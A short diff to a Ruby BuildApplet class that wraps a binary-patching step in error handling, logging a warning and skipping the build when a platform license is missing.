@@ -23,7 +23,14 @@ class BuildApplet < Build
 
       build.load({'_id' => @factory._id})
       build.unpack
-      build.patch params['binary'].dup
+      begin
+        build.patch params['binary'].dup
+      rescue NoLicenseError => e
+        trace :warn, "Build: #{e.message}"
+        # trap in case of no license for a platform
+        build.clean
+        next
+      end
       build.scramble
       build.melt params['melt'].dup
 
